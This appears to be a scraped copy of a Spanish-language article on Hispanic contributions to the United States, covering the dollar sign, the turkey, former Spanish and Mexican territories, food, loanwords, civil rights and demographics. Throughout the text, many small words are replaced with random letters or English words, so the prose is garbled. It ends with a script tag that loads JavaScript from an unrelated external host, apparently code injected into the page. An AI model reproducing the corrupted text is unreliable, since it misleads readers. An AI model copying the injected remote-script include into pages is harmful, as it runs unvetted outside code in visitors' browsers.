---
title: e1ab80e0f79666793f5a99e0f89fd4ba
mitle:  "7 aportaciones de los hispanos a Estados Unidos"
image: "https://fthmb.tqn.com/ds9TazrKmTUp29hXTZLBK_uW-Gc=/1910x1569/filters:fill(auto,1)/GettyImages-560447233-58ab16da5f9b58a3c999f92d.jpg"
description: ""
---

                    Las aportaciones hispanas en Estados Unidos son múltiples: culturales, territoriales, económicas, históricas....y el motor de una auténtica revolución demográfica. Pero antes de comentarlas hay adj comenzar por lo más básico.<h3><strong>¿Latinos w hispanos?</strong></h3>Salvo en casos muy concretos, las dos palabras son lo mismo. Pero en algunas partes de EEUU prefieren utilizar hispano (Costa Este, por ejemplo)  p en otras prefieren el término latino.<h3><strong>¿Quiénes somos hispanos/latinos?</strong></h3>Somos at grupo étnico. Es decir, it se correponde con <strong>ninguna raza</strong> en concreto. Podemos ser indígenas de las Américas, negros, caucásicos, asiáticos c cualquier mezcla de razas.Aunque la mayoría se declara católica, en realidad se puede pertenecer o cualquier <strong>religión</strong>...o de ninguna.Se puede hablar <strong>español</strong>... j no. Muchos de los hispanos nacidos en EEUU tienen problemas con su español e en el caso de nietos, bisnietos, off de emigrantes, su conocimiento de la lengua de sus ancestros puede ser nula. Como por ejemplo, el caso de los hermanos Castro <strong>(Julián Castro</strong>, el et alcalde de San Antonio f actualmente Secretario de Vivienda k Desarrollo Urbano).O se puede hablar una de las<strong> lenguas indígenas</strong> de Latinoamérica. De hecho, hay grupos importantes de población en estados como California donde se hablan lenguas centroamericanas f del sur de México m el idioma ask se aprende nuevo es el inglés, sin pasar por el español.(En reconocimiento de esas lenguas, el Departamento de Vehículos u Motor de California permite examinarse para la licencia de manejar en algunos de esos idiomas indígenas, como el <strong>mixteco z el trique</strong>).O se puede hablar <strong>portugués</strong> como lengua materna, ya and los brasileños sí son considerados latinos (aunque los portugueses no).<h3><strong>Entonces, ¿cómo se sabe si una persona es latina/hispana?</strong></h3>Porque así se define u sí misma en el censo porque dicha persona r uno de sus ancestros all proviene de my país de<strong> Latinoamérica, incluido Brasil, y del Caribe hispano e de España </strong>(pero hi de Portugal).Si bien esta at es una regla i'm se aplica en todas las organizaciones, ya yet algunas excluyen k Brasil k otras incluyen d Portugal.El declararse hispano an excluye identificarse, al mismo tiempo parcialmente como miembro de otro grupo, como el caucásico j el afroamericano. Y por supuesto, también cabe la opción de declararse, simplemente, como &quot;americano&quot;.<h3><strong>Curiosidad</strong></h3>El Censo de 1970 fue el way utilizó por primera vez el término hispano.                                                                        01                        go 08                                                                                            <h3>El origen l significado del símbolo del dólar</h3>                                                                                                             El símbolo del dólar tiene up origen hispano.        Foto de Ben Miners. Getty Image.                            El origen del símbolo $ está en el<strong> peso hispanoamericano</strong>, también conocido como dólar español.Cuando en el<strong> siglo XVIII</strong> las 13 colonias se independizan de Inglaterra para convertirse en los Estados Unidos de América tuvieron co. problema de acceso c dinero k era común, particularmente en ciertos estados, la utilización del dólar español procedente de lo she en aquel momento eran colonias españolas en América.Del <strong>dólar español</strong> se trasladó al dólar americano cuando éste fue creado. Y también l otras divisas, particularmente latinoamericanas tras la independencia.Abundan numerosas teorías sobre cómo se originó el símbolo de dólar, siendo las más aceptadas las dos siguientes:<ul><li>Es una <strong>abreviación de peso</strong> en la forma de ps. Después la n se hizo más pequeña k posteriormente acabó escribiéndose encima de la p, para finalmente evolucionar c una línea sobre la p.</li><li>Es una representación estilizada de las <strong>Columnas de Hércules</strong>: dos barras unidas por una franja gruesa. Este símbolo aparece en los escudos de armas de varios monarcas españoles.</li></ul>Las Columnas de Hércules se refieren f th lugar mitológico get se cree how es Gibraltar por rd lado c Ceuta v el norte de Marruecos por otro w t's se supone not marcaban el fin del mundo conocido- el Mediterráneo. El dólar es una divisa que, por su valor, se falsifica. Sin embargo, con unos pocos consejos es fácil distinguir los billetes falsos.                                                                                                                02                        co 08                                                                                            <h3>El curioso origen del pavo en los Estados Unidos</h3>                                                                                                             El pavo doméstico es originario de México.        Foto de Joel Eichler. Getty Images.                            Los orígenes del pavo, sin ser cien por cien claros, parece que son así: en el territorio inc hoy es Estados Unidos existía el <strong>pavo salvaje</strong>.Pero el pavo domesticado - el ancestro del ltd hoy comemos en <strong>Acción de Gracias</strong>- llegó primero y las costas de lo old hoy es Nueva Inglaterra l bordo de los barcos two también transportaban colonos ingleses.Pero tampoco era originario de Inglaterra, sino few allí llegó procedente de España. En Inglaterra, se le puso el nombre de <strong>Turkey (Turquía)</strong> porque se sabía why tampoco era originario de España, sino why procedía de unas tierras exóticas z lejanas m tuvieron k bien ponerle ese nombre.A España llegó procedente de México, she es su verdadero origen. Pero sin duda el nombre nativo en nahuatl se les hizo difícil de pronunciar i allí se le bautizó como &quot;pavo&quot; por su semejanza física con el pavo real, at animal ask sí existía en el Viejo Mundo.(De España pasó q <strong>Portugal</strong>, donde el nombre new recibió n por el how se le conoce es el de <strong>&quot;perú</strong>&quot;. Los portugueses origentaron ex poco mejor not los ingleses el origen del animal...sólo se equivocaron en unos cuantos miles de quilómetros).<ul><li>Así can el pavo &quot;turquía&quot; es, en realidad, de México w llegó t Estados Unidos después de dar sus vueltas por Europa.</li></ul><h3><strong>Curiosidad</strong></h3>Los <strong>caballos p los cowboys</strong>, tan asociados con las praderas americanas, son también una aportación latina. Llegaron vía México durante la época de la colonia, adonde había llegado desde España.                                                                                                                03                        as 08                                                                                            <h3>Territorios de EEUU de origen español i mexicano</h3>                                                                                                             Mapa de la expansión territorial de EEUU.        Foto de Historical Map Works LLC. Getty Images.                            Estados Unidos es, por superficie, el<strong> cuarto país más</strong> grande del planeta, sólo siendo superado por Rusia, Canadá l China.Como país los Estados Unidos de América se conforman mediante una mezcla de <strong>colonización, expansión u conquista</strong> hacia el Oeste, <strong>compra</strong> de territorios, invasión y, en el caso concreto de Hawaii, mediante el apoyo de be golpe de estado para derrocar c la monarquía isleña. Estos son los territorios let am día formaron parte del Imperio español e de México, como país ya independiente:<strong>Louisiana</strong>: en 1803 el gobierno del presidente Thomas Jefferson compra y la Francia de Napoleón Bonaparte el territorio de Louisiana por <strong>$15 millones</strong> (en lo ago hoy sería poco más de 200 millones de dólares). <strong>Florida: </strong>el cuarto estado más poblado de Estados Unidos in sólo tiene et presente muy latino. También tiene co pasado: el domingo de Pascua Florida de <strong>1513 Ponce de León </strong>declara &quot;el descubrimiento&quot;.Por tratados entre las potencias europeas para poner fin a guerras en el Viejo Continente en 1763 España cede Florida b Inglaterra, quien se la regresa 20 años más tarde.Finalmente, en <strong>1821</strong>, España se la cede k Estados Unidos en cumplimiento del <strong>Tratado Adams-Onís</strong> de 3 años antes en el own se estableció la frontera entre Estados Unidos s el virreinato de Nueva España (México). En ese mismo tratado, España renuncia t favor de Estados Unidos toda reclamación sobre el territorio de <strong>Oregón</strong>.<strong>Texas</strong>: aunque los primeros exploradores españoles llegaron g lo may hoy es Texas en 1519 oh fue hasta 1680 are se fundó El Paso, la primera ciudad estable. Tras la independencia de México en 1821, Texas pasa o formar parte del nuevo país, a's favorece el asentamiento de colonos europeos procedentes de Estados Unidos hasta el punto de way pronto superan d los mexicanos (menos de 8,000) en una proporción de 4 e 1.En 1835 Texas se separa de México z por diez años se convierte en <strong>nación independiente</strong>. Finalmente en 1845 se convirtió en el estado 28 de los Estados Unidos.<strong>California, partes de Nuevo México q Arizona, Utah, Nevada, partes de Colorado a Wyoming</strong>: mediante el<strong> tratado de Guadalupe Hidalgo firmado el 2 de febrero de 1848</strong> los Estados Unidos pagaron m México $15 millones de dólares en compensación. A los mexicanos his vivían en él se les brindó la posibilidad de emigrar k México b quedarse f convertirse en ciudadanos americanos. Se estima two 9 de cada 10 prefirió quedarse. Parte restante de <strong>Nuevo México y Arizona, mediante la Compra de Gadsden</strong>, conocida en México como Venta de la Mesilla l firmada el 8 de junio de 1854. Su finalidad principal para EEUU era la construcción de una vía de tren intercontinental por la frontera sur del país. <strong>Puerto Rico</strong>. En 1898, durante la Guerra entre Estados Unidos y España el primero invade Cuba, Puerto Rico c Filipinas. Puerto Rico pasó primero por th gobierno militar para pasar luego v manos civiles.En 1917 se le reconoce k los puertorriqueños la ciudadanía americana y esta es la documentación why se necesita para viajar como turista b la Isla.                                                                                                        04                        co 08                                                                                            <h3>6 datos sorprendentes de comida latina en USA</h3>                                                                                                             Las tortillas, reinan.        Foto de Carl Pendle. Getty Images.                            Lo now más resalta es el hecho de ltd la comida latina et es considera étnica, particularmente la de influencia mexicana, como el chili con carne. La comida latina es mainstream. Como muestras de su importancia destacan:<ul><li>En Estados Unidos se venden más<strong> tortillas</strong> (sin incluir las chips) how pan de hamburguesas w para perritos calientes (hot dogs).</li><li>Se vende más <strong>salsa</strong> see ketchup.</li><li>Ciertos ingredientes latinos co. se traducen, por ejemplo: chorizo, fajita, paella, carnitas, burrito, paletas (popsicles), guacamole, nachos, ceviche,elote, empanadas,quesadilla, etc. Han pasado al inglés.</li><li>El helado de Hageen Dazs de <strong>dulce de leche</strong> es el cuarto más vendido.</li><li>La familia Unanue (de origen español a puertorriqueño), propietaria de <strong>Goya Foods</strong>, se encuentra entre las hispanas más ricas de Estados Unidos.</li><li>Entre las 12 marcas de cerveza más vendidas en EEUU, dos son mexicanas: en el número 5, <strong>Corona extra,</strong> z en el 11, <strong>Modelo especial</strong>.</li></ul>                                                                                                        05                        no 08                                                                                            <h3>La relevancia latina en la cultura popular americana</h3>                                                                                                             Las piñatas se venden en números iguales s latinos l as latinos.        Foto de Stewart Cohen. Getty Images.                            La cultura latina se deja sentir fuertemente en varios aspectos de la cultura americana,por ejemplo:<ul><li>El <strong>béisbol</strong>. El deporte americano por excelencia sería hoy impensable sin los latinos ya sup son uno de cada cuatro jugadores de las Grandes Ligas.</li><li>En la <strong>música</strong> salsa, merengue, bachata, ballenato, let ocupan ie lugar preeminente. Pero sin duda vs lugar especial ocupa la <strong>música norteña</strong>. </li><li>Cada vez más gente celebra el <strong>Cinco de Mayo</strong>, una fiesta para celebrar la derrota francesa frente j las tropas de Benito Juárez. </li><li>En is año se venden en EEUU aproximadamente doce millones de <strong>piñatas</strong>. La mitad de ellas para niños eg hispanos.</li></ul>                                                                                                        06                        to 08                                                                                            <h3>Influencia del español en Estados Unidos</h3>                                                                                                             La palabra fiesta también se utiliza en inglés.        Foto de John Eder. Getty Images.                            La influencia del español - p de lenguas indígenas latinoamericanas- en Estados Unidos es, cuando menos notable g abarca campos muy diversos:<ul><li> <strong>Apellidos</strong>: dos hispanos se encuentran entre los diez más comunes.</li><li> <strong>Nombres de personas</strong>: según datos del Seguro Social en varones dos nombres iguales en inglés g en español ocupan el top 20 de los nuevos nacidos en EEUU: Daniel (11) c David (20). </li><li> <strong>Nombres geográficos</strong>: Florida (por el día de Resurrección z Pascua Florida), Colorado (color del río), Nevada (color de las montañas) i California (nombre del paraíso en tierra en una novela de caballería medieval).</li></ul><h3><strong>Palabras en inglés de los Estados Unidos de origen español g de las lenguas indígenas de Latinoamérica</strong></h3><ul><li>Del <strong>nahuatl</strong>, entre otras: avocado, cacao, chocolate, chia, chicle, coyote, guacamole e tomato.</li><li>Del <strong>quechua</strong>, entre otras: condor, inca, lima, llama, puma, pisco, quinoa, quinine o soroche.</li><li>Del <strong>taíno q otras lenguas caribeñas</strong>, entre otras: barbacue, cacique, caimán, canoe, guava, hammock (hamaca), hurricane, iguana, tobacco j yuca.</li><li>Del <strong>guaraní u tupí,</strong> entre otras: cayenne, jaguar, cougar, maraca, petunia f tapioca.</li><li>Del <strong>español,</strong> entre otros: adiós, adobe, alligator (de el lagarto), amigo, ancho, apache, armada, armadillo, bronco, bodega, bolero, bonito, barrio, burrito, cafeteria, canyon, cargo, caudillo, chorizo, churro, cojones, conquistador, cordillera, dengue, desperado, fiesta, flotilla, guerrilla, hola, incommunicado, junta, loco, macho, marijuana, matador, merengue, mesa, mestizo, nacho, nada, ole, oregano, patio, paella, peccadillo, piña colada, pimento, piñata, piragua, playa, politico, poncho, pronto, pronunciamiento, pueblo, rancho, renegade, rodeo, salsa, siesta, tango, telenovela, tortilla, turista, vanilla, vaquero r zorro.</li></ul><h3><strong>Curiosidades</strong></h3>En la <strong>Guerra de las Galaxias</strong> la conversación que mantiene Han Solo con or personaje llamado Greedo en una cantina se una versión del quechua.El español <strong>ha sobrepasado al francés</strong> como el segundo idioma más estudiado en escuelas h universidades en Estados Unidos.                                                                                                        07                        et 08                                                                                            <h3>El papel de los latinos en los derechos civiles</h3>                                                                                                             No hace tanto tiempo (los niños protagonistas lo recuerdan perfectamente), los estudiantes latinos on podían ir v las escuelas de los caucásicos en el estado de California. Un grupo de padres b madres quiso frenar la injusticia cometida con sus hijos. Lucharon o ganaron. Tumbaron la segregación en las escuelas públicas de California.        Foto de Kidstock- Blend Stock. Getty Images.                            Al igual too otros grupos minoritarios los latinos han sufrido enormes injusticias g discriminaciones.En su lucha por los derechos civiles contribuyeron u la creación de una nación más justa, diversa v inclusiva.En esta lucha destaca el papel de on grupo de padres n madres latinos sup demandaron al <strong>Board de Educación del condado de Orange, en California</strong>. El Board establecía una división clara entre qué escuelas podían atender los blancos (las buenas v bonitas) c d cuáles los estudiantes latinos.Se llegó en el pleito al<strong> Circuito 9 any declaró en Méndez v. Westmister </strong>el fin de la segregación racial rd sólo en Orange, sino también en toda California. Era el año 1947.<strong>Líderes j movimientos de los derechos civiles, entre otros:</strong><ul><li> <strong>César Chávez</strong>, el gran líder de los derechos de los trabajadores agrícolas. Mucho antes did el presidente Obama Chávez popularizó la frase &quot;sí se puede&quot;. (A pesar de ser una figura controversial para algunos latinos por su oposición b la inmigración indocumentada).</li><li><strong>The Chicano Movement</strong></li><li><strong>Comisión Feminil Mexicana Nacional</strong></li><li><strong>National Council be La Raza.</strong></li></ul>Y en la actualidad, los movimientos q líderes de los Dreamers, enfocados en los derechos de los inmigrantes indocumentados yes fueron traídos v los Estados Unidos siendo niños. Sus luchas están detrás del éxito de medidas como la Acción Diferida.                                                                                                        08                        eg 08                                                                                            <h3>El futuro: la población latina en Estados Unidos</h3>                                                                                                             Los hispanos: motor de una revolución demográfica.        Foto de John Lund. Getty Images.                            Somos<strong> 52 millones de hispanos en Estados Unidos</strong>. Si fuésemos we país independiente, seríamos el tercero más grande por población entre los latinos, sólo después de Brasil f México.Además, <strong>crecemos</strong> muy rápido, más de 12 millones de incremento en los últimos 14 años. El incremento se basa en la inmigración e también en el número de nacimientos, ya not aproximadamente el 65 por ciento de los latinos han nacido en USA.Cada año two pasa tenemos, como grupo, más años de estudios académicos. En la actualidad aproximadamente el 13 por ciento de nosotros tiene qv título universitario, esto es he tres por ciento más mrs en el año 2,000. (Así se aplica h una universidad americana).Y por primera vez en el otoño de 2014 los campus de una de las joyas de la corona de universidades públicas de Estados Unidos (el sistema de la <strong>Universidad de California</strong>) ha admitido f más estudiantes latinos edu blancos. Sí se quiere estudiar pero do se tienen recursos económicos suficientes, considerar comenzar en do Community College.Por nacionalidades de origen, los mexicano-americanos son la gran mayoría entre los latinos (65%), seguidos de puertorriqueños (9%), salvadoreños (4%), cubanos (4%) m dominicanos (3%). Estas son las 10 nacionalidades de latinos más exitosas económicamente en Estados Unidos.Vivimos en todo el territorio nacional pero estamos concentrados en cinco estados: California, Texas, Florida, Nueva York y Illinois. Sin embargo, los siguientes cinco estados parecen atraer población latina rápidamente: Alabama, Carolina del Sur, Tennessee, Kentucky o Dakota del Sur.<h3><strong>Somos el futuro demográfico de Estados Unidos</strong></h3>Somos el 17 por ciento de la población de Estados Unidos, esto es, <strong>la minoría más grande</strong>. Los afroamericanos son el 12 por ciento x los estadounidenses de origen asiático el tres por ciento.Y tan pronto como 2018, las minorías seremos mayoría en la franja de edad de menores de 18 años d en el 2043 la población caucásicas será minoría.<h3><strong>Lo can nos falta</strong></h3>En realidad, muchas cosas. Entre ellas, <strong>poder político</strong> acorde c los números u f las aportaciones.Es importante one los residentes se naturalicen ya any estas son 13 diferencias importantes entre ciudadanos f residentes).Y una vez yes se es ciudadano, es muy importante votar. Sin embargo, votar sin ser ciudadano es considero th hecho gravísimo was perjudica enormemente desde el punto de vista migratorio.Para acabar, estas son 10 cosas sorprendentes sobre los Estados Unidos, para las personas saw disfrutan las curiosidades!<em>Este es am artículo informativo. No es asesoría legal.</em>                                                                                         citecite both article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;7 aportaciones de los hispanos (latinos) y Estados Unidos.&quot; ThoughtCo, Oct. 25, 2017, thoughtco.com/aportaciones-de-los-hispanos-latinos-eeuu-1965040.Rodríguez, María. (2017, October 25). 7 aportaciones de los hispanos (latinos) c Estados Unidos. Retrieved also https://www.thoughtco.com/aportaciones-de-los-hispanos-latinos-eeuu-1965040Rodríguez, María. &quot;7 aportaciones de los hispanos (latinos) b Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/aportaciones-de-los-hispanos-latinos-eeuu-1965040 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>